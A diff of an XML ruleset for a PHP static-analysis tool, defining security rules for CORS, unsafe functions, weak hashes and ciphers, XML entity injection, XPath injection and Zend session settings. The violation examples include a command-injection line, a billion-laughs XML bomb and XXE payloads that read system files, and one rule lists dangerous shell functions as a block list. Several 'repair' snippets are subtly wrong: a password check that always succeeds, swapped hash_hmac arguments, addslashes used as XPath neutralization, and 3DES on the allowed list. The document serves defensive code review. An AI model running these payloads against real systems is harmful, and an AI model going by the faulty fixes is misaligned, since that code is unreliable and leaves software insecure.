+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/79.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:79,CWETOP25:2021:2,OWASP:2021:A3,PCI-DSS:6.5.7]]></security>
+    </normatives>
+    <properties>
+      <property name="inputs" descname="Comma-separated list of input types to consider as sources (user_input, file_input, database_input, other_input)" value="database_input"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.TooBroadCORSPolicy" message="TooBroadCORSPolicy: CORS policy (Cross-origin resource sharing) too broad" class="com.optimyth.qaking.php.rules.security.TooBroadCORSPolicy" technology="PHP" active="true">
+    <tags><![CDATA[CORS,CWEScope:Access-Control]]></tags>
+    <description><![CDATA[SOP (Same origin policy) mechanism restricts access to content loaded from a web site other than current document origin.
+
+It is a powerful security feature when preventing attacks through malicious scripts, as Cross site scripting attacks.
+
+In HTML5, SOP feature can be disable specifying a CORS (Cross-origin resource sharing) policy using the new HTTP header
+Access-Control-Allow-Origin.
+
+This new header provides flexibility but must be used carefully. With a too broad CORS policy, exploitability of security flaws
+increases notably.
+
+This rule emits violation if Access-Control-Allow-Origin header is set to "*", universal access.]]></description>
+    <priority>1</priority>
+    <effort>2</effort>
+    <vulntype>Misconfiguration</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Avoid a too broad CORS policy.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?
+  // VIOLATION, too-broad cross-origin requests permitted
+  header("Access-Control-Allow-Origin: *");
+?>]]></example>
+    <repair><![CDATA[<?php
+// Safer way to allow controlled cross-domain Ajax requests:
+// Enumerate the allowed origins here
+// (remember, http and https make different origins)
+$allowed_origins = array(
+  "http://public.app.myorg.com",
+  "https://api.myorg.com",
+  "https://other.myorg.com"
+);
+
+if (isset($_SERVER["HTTP_ORIGIN"]) === true) {
+	$origin = $_SERVER["HTTP_ORIGIN"];
+	// is allowed origin?
+	if (in_array($origin, $allowed_origins, true) === true) {
+		header('Access-Control-Allow-Origin: ' . $origin);
+		header('Access-Control-Allow-Credentials: true'); // if session cookie is needed
+		header('Access-Control-Allow-Methods: POST'); // add more methods if needed
+		header('Access-Control-Allow-Headers: Content-Type'); // add more headers if needed
+	}
+	if ($_SERVER["REQUEST_METHOD"] === "OPTIONS") {
+		exit; // pre-flight OPTIONS request wants only the policy, we can stop here
+	}
+}
+?>
+
+The client (JavaScript) code could be something like this
+(with page rendered by any origin in the $allowed_origins array):
+
+var http_request = new XMLHTTPRequest();
+http_request.onreadystatechange = function () { /* .. */ };
+http_request.open("POST", "https://public.app.myorg.com");
+http_request.withCredentials = true;
+http_request.setRequestHeader("Content-Type", "application/json");
+http_request.send({ /* ... */ });]]></repair>
+    <reference><![CDATA[https://w3c.github.io/webappsec-cors-for-developers,http://cwe.mitre.org/data/definitions/942.html,https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties,https://www.moxio.com/blog/12/how-to-make-a-cross-domain-request-in-javascript-using-cors]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:942,OWASP:2021:A5,PCI-DSS:6.5.10,WASC:15]]></security>
+    </normatives>
+    <properties>
+      <property name="disallowedOriginPattern" descname="Regular expression for CORS origins considered illegal" value="\*|null"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.UnsafeFunction" message="UnsafeFunction: Use of Potentially Dangerous Function" class="com.optimyth.qaking.php.rules.security.UnsafeFunction" technology="PHP" active="true">
+    <description><![CDATA[Some functions in PHP are inherently dangerous and should not be called, unless the calling code is carefully reviewed
+and proper neutralization ensures that the call will not cause a security problem.
+
+This check reports any call to the unsafe functions listed in the 'unsafeFunctions' parameter.]]></description>
+    <priority>3</priority>
+    <effort>3</effort>
+    <vulntype>Design error</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+  // VIOLATION, source code may contain sensitive information
+  highlight_file('mysource.php');
+
+  ob_start();
+  // VIOLATION, trivial OS command injection
+  passthru($_GET['cmd']);
+  $var = ob_get_contents();
+  ob_end_clean();
+?>]]></example>
+    <repair><![CDATA[// Do not call unsafe functions; use safer alternatives. See PHP documentation for details.]]></repair>
+    <reference><![CDATA[https://www.owasp.org/index.php/PHP_Configuration_Cheat_Sheet]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:676,PCI-DSS:6.5.6]]></security>
+    </normatives>
+    <properties>
+      <property name="unsafeFunctions" descname="Comma-separated list of dangerous functions to avoid.">
+        <value><![CDATA[
+system, exec, shell_exec, passthru, phpinfo, show_source, highlight_file, popen, proc_open, fopen_with_path,
+dbmopen, dbase_open, putenv, chdir, mkdir, rmdir, chmod, rename, filepro, filepro_rowcount,
+filepro_retrieve, posix_mkfifo, FFI.cdef, FFI.load, FFI.new, FFI.scope
+        ]]></value>
+      </property>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.WeakCryptographicHash" message="WeakCryptographicHash: Weak cryptographic hash" class="com.optimyth.qaking.php.rules.security.WeakCryptographicHash" technology="PHP" active="true">
+    <tags><![CDATA[CWEScope:Accountability,CWEScope:Confidentiality,CWEScope:Integrity,CWEScope:Non-Repudiation,crypto,hash]]></tags>
+    <description><![CDATA[Use of weak cryptographic hash does not guarantee data integrity.
+
+A (cryptographic) hash function maps data of arbitrary size ("the message") to a bit string of a fixed size ("the digest"),
+designed to be a 'one-way' function, infeasible to invert. Ideally, a brute-force search of possible inputs to check
+for a match on the expected digest (or a 'rainbow' table of precomputed message/hash pairs) should be the unique way
+to recreate an input for a given digest.
+
+Hash functions are the "workhorses" of modern cryptography, with many usages in digital signatures, message authentication codes (MACs),
+symmetric key generation, indexing in hash tables, duplicate data detection, checksum against accidental data corruption...
+
+A hash function hash() should have resistance against certain attacks:
+* pre-image resistance: given hash value h, it should be difficult to find m such that h = hash(m).
+* second pre-image resistance: given m1, it should be difficult to find another m2 such that hash(m1) = hash(m2).
+* collision resistance ("birthday attack"): it should be difficult to find m1, m2 such that hash(m1) = hash(m2).
+* length-extension resistance: given hash(m) and len(m) but not m, by choosing a suitable m' an attacker can calculate hash(m | m')
+  (| denotes concatenation).
+
+Resources needed for brute-force attacks obviously vary exponentially with hash size in bits, while for other attacks
+could be half the bits in time or pre-image space (or much lower, if the algorithm has weaknesses).
+
+MD5, SHA1 and SHA2 are often used to verify the integrity of data but last advances in cryptanalysis have discovered weaknesses in both algorithms.
+In particular, they use the Merkle-Damgard construction, which are vulnerable to length-extension attacks against naive MAC generation
+like hash(K | M).
+
+Note: Currently, PHP 7.1+ standard hash() functions include the latest NIST standarized hash algorithm SHA-3 (Keccak),
+which is a variable-size hash function (actually, a "cryptographic sponge") under sha3-224 ... sha3-512. When available
+their usage is recommended in new code.
+
+The rule looks for usages of crypto primitives (hash or hmac) using a weak algorithm. For Symfony applications, the security.yaml
+configuration files are checked for a password encoding configuration using a weak hash scheme.]]></description>
+    <priority>2</priority>
+    <effort>3</effort>
+    <vulntype>Encryption and randomness</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Avoid weak algorithms when verifying data integrity.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+$plain_pass = $_POST['password'];
+$valid = False;
+// typically, read from database (stored user-password hash)
+$expected_pwd_hash = '1f3870be274f6c49b3e31a0c6728957f';
+
+// VIOLATION, unsafe MD5 used in password hash
+// (and no salt, different timing when password does not match...)
+$hashed_pass = md5($plain_pass); // password hashing
+if ($hashed_pass === $expected_pwd_hash) { // password verification, vulnerable to timing attacks
+  $valid = True;
+}
+// VIOLATION, same using hash() function
+$hashed_pass = hash('md5', $plain_pass);
+
+// VIOLATION: Generating insecure MAC with unsafe hash function (SHA1, too short)
+// and key plus message concatenation (vulnerable to length-extension attack).
+$hmac = hash('sha1', $secret_key . $message);
+if($hmac === $received_hmac) { ... }
+?>]]></example>
+    <repair><![CDATA[<?php
+$plain_pass = $_POST['password'];
+$valid = False;
+$expected_pwd_hash = '$2y$13$QjSH496pcT5CEbzjD/vtVeH03tfHKFy36d4J0Ltp3lRtee9HDxY3K';
+
+// FIXED: proper password hashing (at password registration), bcrypt for key stretching
+$hashed_pass = password_hash($plain_pass, PASSWORD_BCRYPT, array('cost' => 13));
+
+// For verification, the hash also encodes algorithm, cost, and salt;
+// and this is not vulnerable to timing attacks
+if (password_verify($plain_pass, $hashed_pass)) { // FIXED
+  $valid = True;
+}
+
+// FIXED, longer hash and RFC 2104, which defeats length-extension attacks
+$hmac = hash_hmac('sha256', $secret_key, $message);
+if(hash_equals($hmac, $received_hmac)) { ... }
+?>]]></repair>
+    <reference><![CDATA[http://www.zimuel.it/blog/strong-cryptography-in-php,https://en.wikipedia.org/wiki/Hash_function_security_summary,http://php.net/manual/en/faq.passwords.php,https://crackstation.net/hashing-security.htm,http://cwe.mitre.org/data/definitions/328.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:328,OWASP:2021:A2,PCI-DSS:6.5.3,WASC:50]]></security>
+    </normatives>
+    <properties>
+      <property name="allowedAlgorithms">
+        <value><![CDATA[
+sha224, sha256, sha384, sha512, sha3, sha3-224, sha3-256, sha3-384, sha3-512, keccak, ripemd160, rmd160, ripemd256, ripemd320, whirlpool, dss1, bcrypt, pbkdf2
+        ]]></value>
+      </property>
+      <property name="forbiddenAlgorithms">
+        <value><![CDATA[
+md2, md4, md5, sha1, gost, gost-crypto, tiger128, tiger160, tiger192, panama, haval128, snefru, ripemd128, adler32, crc32, crc32b, fnv132, fnv1a32, fnv164, fnv1a64, joaat, plaintext
+        ]]></value>
+      </property>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.WeakEncryptionAlgorithm" message="WeakEncryptionAlgorithm: Weak symmetric encryption algorithm" class="com.optimyth.qaking.php.rules.security.WeakEncryptionAlgorithm" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:2.9.3,ASVS-v4.0.2:6.2.2,ASVS-v4.0.2:8.3.7,CWEScope:Accountability,CWEScope:Confidentiality,CWEScope:Integrity,CWEScope:Non-Repudiation,crypto]]></tags>
+    <description><![CDATA[Using a weak encryption algorithms does not guarantee the confidentiality of sensitive data.
+
+Home-grown ciphers, or standard algorithms that were proven flawed or weak, compromise the confidentiality of data.
+
+Encryption algorithms like DES, Triple-DES and RC2 are nowadays too weak for cryptographic usage,
+in particular for ensuring information confidentiality.
+
+DES is currently broken, as an small key size renders it unsafe against brute-force attacks.
+
+RC2 is currently broken, as a related-key attack, where an attacker finds mathematical relationships
+between key values, renders it unsafe as well.
+
+Triple-DES (or 3DES) is weak, and should be migrated to a more robust standard cipher.
+
+The AES standard algorithm, with an adequate key length and proper setup (initial vector, mode, padding)
+should be used instead, for cryptographic operations.
+
+The rule checks usages of weak ciphers in cryptographic primitives, not registred in the allowed list, and registed in the forbidden list.
+The rule does not check if the cipher operation is coded properly (key length, initial vector and feedback mode, padding).]]></description>
+    <priority>2</priority>
+    <effort>3</effort>
+    <vulntype>Encryption and randomness</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Avoid compromising sensitive data.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+    // VIOLATION, DES is broken (and ECB mode should not be used in general)
+    $ciphertext = mcrypt_encrypt(MCRYPT_DES, $key, $message, MCRYPT_MODE_ECB);
+?>]]></example>
+    <repair><![CDATA[<?php
+  $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CFB);
+  $iv = mcrypt_create_iv($iv_size, MCRYPT_DEV_URANDOM);
+  // FIXED
+  $ciphertext = mcrypt_encrypt(MCRYPT_RIJNDAEL_128, $key, $message, MCRYPT_MODE_CFB, $iv);
+?>]]></repair>
+    <reference><![CDATA[http://www.zimuel.it/blog/strong-cryptography-in-php,https://blog.cryptographyengineering.com/2012/05/19/how-to-choose-authenticated-encryption/,http://cwe.mitre.org/data/definitions/327.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:327,OWASP-M:2016:M5,OWASP:2021:A2,PCI-DSS:6.5.3,WASC:04]]></security>
+    </normatives>
+    <properties>
+      <property name="allowedAlgorithms" value="aes, rijndael, camellia, cast, cast5, tripledes, 3des, des3, des-ede, des-ede3, mars, twofish, saferplus, seed, serpent, idea, rc5, rc6, rabbit, trivium, salsa20, chacha20"/>
+      <property name="forbiddenAlgorithms" value="des, desx, gost, loki, blowfish, enigma, rc2, rc4, arc4, arcfour, rc4drop, threeway, kasumi, panama, skipjack, crypt"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.XmlEntityInjection" message="XmlEntityInjection: XML entity injection" class="com.optimyth.qaking.php.rules.security.XmlEntityInjection" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:5.5.2,CWEScope:Availability,CWEScope:Confidentiality,CWEScope:Integrity]]></tags>
+    <description><![CDATA[In XML parsers, when XML document to parse could be altered by untrusted input, and the untrusted input may
+alter the Document Type Definition (DTD, embedded or external), the parser should be configured to avoid
+two kinds of potential attacks:
+
+* XML entity expansion DoS (XML bomb or "billion laughs attack"), CWE-776, where well-formed DTD with
+  internal entities are expanded exponentially until they exhaust memory.
+
+* XML external entity injection (XXE), CWE-611, where an external entity controlled by the attacker refers to the URL
+  of a resource that gives unauthorized access to sensitive files on the server machine, or to a resource
+  like /dev/random in Unix systems that, when entity is expanded, leads to a denial-of-service condition.
+  A variant of this attack is the server-side request forgery (SSRF), where the URL for external DTD or XML-Schema
+  is processed by the URL handler used by the XML parser, allowing the attacker access to an unexpected
+  network resource (for cross-site request forgery attacks or port-scanning enumeration).
+
+A particular parser might be vulnerable to XML entity injection attacks when their default settings have both entity expansion
+and external entity resolution enabled. Disabling validations does not help, as entity expansion / external entity loading is done,
+even when validation is disabled.
+
+DTD is not the unique element that an attacker could use for injection: XML-Schema attributes could be specified
+on any tag, so SSRF injection may happen at any place in the XML document, not only at the start where DTD should
+be placed, but fortunately common parsers do not seem to fetch schema URLs by default.
+
+XML parsing could be hidden in other frameworks and libraries. For example, with REST, when a resource has an XML
+representation, the REST framework typically use an underlying XML parser for processing the request message, which
+obviusly is fully under control of a potential attacker.
+
+To be safe during XML processing coming from untrusted sources, a number of XML features should be disabled
+when configuring the parser:
+* DTD interpretation - Ensure DOCTYPE tags are ignored, or documents containing them are rejected.
+* Ignore or reject external entities.
+* schemaLocation and noNamespaceSchemaLocation should not fetch URLs.
+* XIncludes - Should be disabled or left disabled.
+
+The rule checks that there is a path between an untrusted input and the XML document to parse,
+then verifies that the XML parser is configured to avoid both external entity and entity expansion attacks.
+
+XML parsers available in the PHP ecosystem are either wrappers over existing native XML parsers (like Expat or libxml2),
+with some of them allowing bad configuration leading to XXE or entity expansion attacks.]]></description>
+    <priority>1</priority>
+    <effort>3</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Avoid XML entity attacks that could cause denial-of-service and information leakage.]]></benefits>
+    <inconvenients><![CDATA[Dependencies on certain features related to DTD or entity expansion may render runtime errors.]]></inconvenients>
+    <example><![CDATA[<?php
+  $xmlString = $_POST['xml'];
+  $dom = new DOMDocument;
+  // VIOLATION, entity expansion might be allowed by default
+  $dom->loadXML($xmlString);
+  // VIOLATION, entity expansion explicitly allowed
+  $dom->loadXML($xmlString, LIBXML_NOENT);
+?>
+
+This code is vulnerable to well-known XML attack vectors like:
+
+* "billion laughs" attack, 1K payload expands to 3GB!:
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+ <!ENTITY lol "lol">
+ <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+ <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+ <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+ <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+ <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+ <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+ <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+
+* XXE (external entity attack), for sensitive file disclosure:
+<!DOCTYPE roottag [
+ <!ENTITY windowsfile SYSTEM "file:///c:/boot.ini">
+]>
+<roottag>
+ <sometag>&windowsfile;</sometag>
+</roottag>
+
+* XXE, for denial-of-service under Unix servers:
+<!DOCTYPE foo [
+  <!ELEMENT root ANY >
+  <!ENTITY unixfile SYSTEM "file:///dev/random" >
+]>
+<root>&unixfile;</root>]]></example>
+    <repair><![CDATA[<?php
+  $xmlString = $_POST['xml'];
+  $oldValue = libxml_disable_entity_loader(true); // avoid external entity expansion
+  $domOk = new DOMDocument;
+  $domOk->loadXML($xmlString); // fixed
+  libxml_disable_entity_loader($oldValue);
+?>]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/611.html,http://cwe.mitre.org/data/definitions/776.html,XML Schema, DTD, and Entity Attacks: http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf,http://phpsecurity.readthedocs.io/en/latest/Injection-Attacks.html#xml-injection,OWASP XML External Entity Processing: https://www.owasp.org/inde]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:611,CWE:776,CWETOP25:2021:23,OWASP:2021:A5,PCI-DSS:6.5.1,WASC:43,WASC:44]]></security>
+    </normatives>
+    <properties>
+      <property name="parametersAsSources" descname="Assume that method parameters are untrusted inputs" value="true"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.XPathInjection" message="XPathInjection: Improper Neutralization of Data within XPath Expressions ('XPath Injection')" class="com.optimyth.qaking.php.rules.security.XPathInjectionRule" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:5.3.10,CWEScope:Access-Control,CWEScope:Confidentiality]]></tags>
+    <description><![CDATA[PHP functions like xpath_eval or xpath_eval_expression execute a XPath search on a XML DOM tree. If the location path depends on non-neutralized user-input, a potential XPath Injection vulnerability could be present, enabling user control on the nodes returned by the XPath search functions.
+
+To neutralize parts depending on user input in XPath location paths, you may use the addslashes() neutralization function.]]></description>
+    <priority>2</priority>
+    <effort>2</effort>
+    <vulntype>Injection</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[It improves the safety.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+$xpath = "//User[username/text()='" . $_POST['user'] . " AND password/text()='" . $_POST['pass'] . "'";
+// Using SimpleXMLElement::xpath()
+$login = simplexml_load_file("users.xml");
+// VIOLATION: XPath Injection
+$result = $login->xpath( $xpath );
+
+// Other XPath Injection, using xpath_eval()
+$dom = domxml_open_file("users.xml");
+$xpc = &$dom->xpath_new_context();
+// VIOLATION: XPath Injection
+$result = $xpc->xpath_eval( $xpath );
+?>]]></example>
+    <repair><![CDATA[<?php
+$user = addslashes($_POST['user']);
+$password = addslashes($_POST['pass']);
+// Properly neutralized user-controlled input
+$xpath = "//User[username/text()='" . $user . " AND password/text()='" . $password . "'";
+
+// Using SimpleXMLElement::xpath()
+$login = simplexml_load_file("users.xml");
+// FIXED
+$result = $login->xpath( $xpath );
+
+// Other XPath Injection, using
+$dom = domxml_open_file("users.xml");
+$xpc = &$dom->xpath_new_context();
+// FIXED
+$result = $xpc->xpath_eval( $xpath );
+?>]]></repair>
+    <reference><![CDATA[http://cwe.mitre.org/data/definitions/643.html]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:643,OWASP:2021:A3,PCI-DSS:6.5.1]]></security>
+    </normatives>
+    <properties>
+      <property name="inputs" descname="Comma-separated list of input types to consider as sources (user_input, file_input, database_input, other_input)" value="user_input"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <rule name="OPT.PHP.ZendConfiguration" message="ZendConfiguration: Zend framework session management configuration" class="com.optimyth.qaking.php.rules.security.ZendConfiguration" technology="PHP" active="true">
+    <tags><![CDATA[ASVS-v4.0.2:14.3.3,ASVS-v4.0.2:3.4.1,ASVS-v4.0.2:7.3.3,ASVS-v4.0.2:8.3.4,CWEScope:Confidentiality,Framework:Zend]]></tags>
+    <description><![CDATA[Weakness in Zend framework session management configuration include:
+
+- Secure flag not active.
+- Use of overly broad path for session storage.
+- HttpOnly flag not active.]]></description>
+    <priority>2</priority>
+    <effort>2</effort>
+    <vulntype>Misconfiguration</vulntype>
+    <impl>1</impl>
+    <benefits><![CDATA[Avoid compromising user accounts.]]></benefits>
+    <inconvenients><![CDATA[]]></inconvenients>
+    <example><![CDATA[<?php
+function a() {
+  // Zend 1.x
+  Zend_Session::setOptions(
+   array('cookie_secure' => false,     // VIOLATION
+         'save_path' => '/',           // VIOLATION
+         'cookie_httponly' => false)); // VIOLATION
+  Zend_Session::start();
+
+  // Zend 2.x
+  $config = new SessionConfig();
+  $config->setOptions(array(
+    'cookie_secure'   => false,        // VIOLATION
+    'save_path'       => '/',          // VIOLATION
+    'cookie_httponly' => false,        // VIOLATION
+  ));
+  $manager = new SessionManager($config);
+}
+?>]]></example>
+    <repair><![CDATA[<?php
+function a() {
+  // Zend 1.x
+  Zend_Session::setOptions(
+   array('cookie_secure' => true,           // OK
+         'save_path' => '/sessions/mySSL',  // OK
+         'cookie_httponly' => true));       // OK
+  Zend_Session::start();
+
+  // Zend 2.x
+  $config = new SessionConfig();
+  $config->setOptions(array(
+    'cookie_secure'   => true,              // OK
+    'save_path'       => '/sessions/mySSL', // OK
+    'cookie_httponly' => true,              // OK
+  ));
+  $manager = new SessionManager($config);
+}
+?>]]></repair>
+    <reference><![CDATA[http://static.zend.com/topics/Webinar-Zend-Secure-Application-Development-with-the-Zend-Framework.pdf]]></reference>
+    <normatives>
+      <security><![CDATA[CWE:1004,CWE:200,CWE:614,CWETOP25:2021:20,OWASP:2021:A1,OWASP:2021:A5,PCI-DSS:6.5.10,PCI-DSS:6.5.5,WASC:13,WASC:47]]></security>
+    </normatives>
+    <properties>
+      <property name="checkSSL" descname="Check if session data are sent over SSL." value="true"/>
+      <property name="checkHTTPOnly" descname="Check if HTTPOnly flag is set." value="true"/>
+      <property name="checkBroadPath" descname="Check if session data are stored in root context path." value="true"/>
+    </properties>
+    <idcat>OPT.CRITERIUM_VALUE.CQM.SECURITY</idcat>
+  </rule>
+  <categories>
+    <category name="PHP" technology="PHP" active="true" weight="1.0">
+      <description><![CDATA[PHP rules]]></description>
+      <children>
+        <category name="OPT.CRITERIUM_VALUE.CQM.EFFICIENCY" technology="PHP" active="true" weight="0.0">
+          <description><![CDATA[Efficiency]]></description>
+        </category>
+        <category name="OPT.CRITERIUM_VALUE.CQM.MAINTAINABILITY" technology="PHP" active="true" weight="0.0">
+          <description><![CDATA[Maintainability]]></description>
+        </category>
+        <category name="OPT.CRITERIUM_VALUE.CQM.PORTABILITY" technology="PHP" active="true" weight="0.0">
+          <description><![CDATA[Portability]]></description>
+        </category>
+        <category name="OPT.CRITERIUM_VALUE.CQM.RELIABILITY" technology="PHP" active="true" weight="0.0">
+          <description><![CDATA[Reliability]]></description>
+        </category>
+        <category name="OPT.CRITERIUM_VALUE.CQM.SECURITY" technology="PHP" active="true" weight="10.0">
+          <description><![CDATA[Security]]></description>
+        </category>
+      </children>
+    </category>
+  </categories>
+</ruleset>
